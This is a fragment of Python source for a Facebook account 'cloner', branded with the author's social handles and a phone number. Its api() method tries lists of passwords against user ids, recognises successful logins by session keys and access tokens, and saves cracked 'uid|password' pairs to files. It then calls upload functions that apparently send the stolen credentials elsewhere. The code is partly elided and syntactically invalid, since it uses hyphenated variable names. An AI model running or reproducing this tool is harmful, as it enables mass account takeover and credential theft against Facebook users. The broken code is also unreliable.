...
\033[1;93m══════════════════════════════════════════════════
\033[0;96m [\033[0;96m✯\033[1;96m] \033[0;96mFB GROUP : Muslim cyber
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mGITHUB   : SHAHZADA-AHMED
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWARNING  :  SAJJAD VERSION 2.0
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWHATSAPP : 01840215106
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mFACEBOOK : Shahzada Ahmed Sajjad
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mVERSION : 2.0
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mLOVERS : VAI BROTHERS
\033[1;93m══════════════════════════════════════════════════
    """)   
		print("%s [%s•%s] %sTOOL NAME : %sSUCCESS-SAJJAD PRO CLONER"%(R,C,R,C,G))
		...
		print(GET)
		SUCCESS-SAJJAD = input("\n%s [?] CHOICE : "%(C))
		if SUCCESS-SAJJAD in ["", " "]:
			Main()
		if SUCCESS-SAJJAD in ["1", "01"]:
				self.SUCCESS-SAJJAD1()
		if SUCCESS-SAJJAD in ["2", "02"]:
				self.SUCCESS-SAJJAD2()
		if SUCCESS-SAJJAD in ["3", "03"]:
				self.SUCCESS-SAJJAD3()
		if SUCCESS-SAJJAD in ["4", "04"]:
				self.SUCCESS-SAJJAD4()
		if SUCCESS-SAJJAD in ["5", "05"]:
				self.SUCCESS-SAJJAD5()
		if SUCCESS-SAJJAD in ["6", "06"]:
				self.SUCCESS-SAJJAD6()
		if SUCCESS-SAJJAD in ["7", "07"]:
				self.SUCCESS-SAJJAD7()
		if SUCCESS-SAJJAD in ["8", "08"]:
				self.SUCCESS-SAJJAD8()
		if SUCCESS-SAJJAD in ["9", "09"]:
				self.SUCCESS-SAJJAD9()
		if SUCCESS-SAJJAD in ["10","১০"]:
				self.SUCCESS-SAJJAD10()
		if SUCCESS-SAJJAD in ["P", "p"]:
			exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SUCCESS-SAJJAD] : %s/%s -> \033[0;92m [ SUCCESS-SAJJAD-OK:%s ]- \033[0;91m[SUCCESS-SAJJAD-CP:%s ]"%(C,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SUCCESS-SAJJAD-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SUCCESS-SAJJAD-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			if "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SUCCESS-SAJJAD-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SUCCESS-SAJJAD-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
